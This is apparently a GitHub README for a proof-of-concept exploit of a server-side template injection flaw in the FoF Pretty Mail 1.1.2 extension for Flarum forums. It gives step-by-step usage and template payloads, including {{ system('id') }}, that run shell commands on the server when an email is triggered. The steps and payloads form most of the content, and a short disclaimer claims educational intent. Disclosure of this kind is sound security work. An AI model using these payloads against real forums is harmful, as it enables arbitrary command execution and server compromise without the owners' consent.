# FoF Pretty Mail SSTI 1.1.2 Exploit for Flarum
Exploit for a critical Server-Side Template Injection (SSTI) vulnerability discovered in the FoF Pretty Mail extension (version 1.1.2) used by Flarum forums. The vulnerability stems from improper sanitization of template variables, allowing attackers with administrative privileges to execute arbitrary code on the server.

<br>
Usage:

1. Obtain administrative access to a Flarum forum with the FoF Pretty Mail extension installed.
2. Navigate to the extension settings and access the email template editor.
3. Inject the following payloads into the template:
    {{ 7*7 }} (demonstrates basic template expression evaluation)
    {{ system('id') }} (executes a system command to display user information)
    {{ system('echo "Take The Rose"') }} (executes a custom command)
4.  Save the modified template and trigger an email event (e.g., user registration).
5.  Observe the execution results in the received email, confirming the successful exploitation.


POC:
Editing the E-mail Template
Payload: <br>
```bash
{{ 7*7 }}
{{ system('id') }}
{{ system('echo "Take The Rose"') }}
```
<br>

![image](https://github.com/blue0x1/FoF-Pretty-Mail-SSTI-Exploit-for-Flarum/assets/52697989/116297d3-045f-4d69-be69-a524ad1de63c)

<br> 
Trigger reset password action ( or any other action) to receive e-mail
<br>
<br>

![image](https://github.com/blue0x1/FoF-Pretty-Mail-SSTI-Exploit-for-Flarum/assets/52697989/f0e0121a-8f32-41be-9ab4-23335fe184dc)
<br>
on the email received:
<br> 

![image](https://github.com/blue0x1/FoF-Pretty-Mail-SSTI-Exploit-for-Flarum/assets/52697989/aee3b6c4-fbbe-4a9b-b86e-28ec473028ca)


Disclaimer:

This repository is intended for educational and research purposes only. The exploit is provided to raise awareness about the vulnerability and promote security best practices among Flarum users and developers. Unauthorized use of this exploit against systems without explicit consent is illegal and unethical.
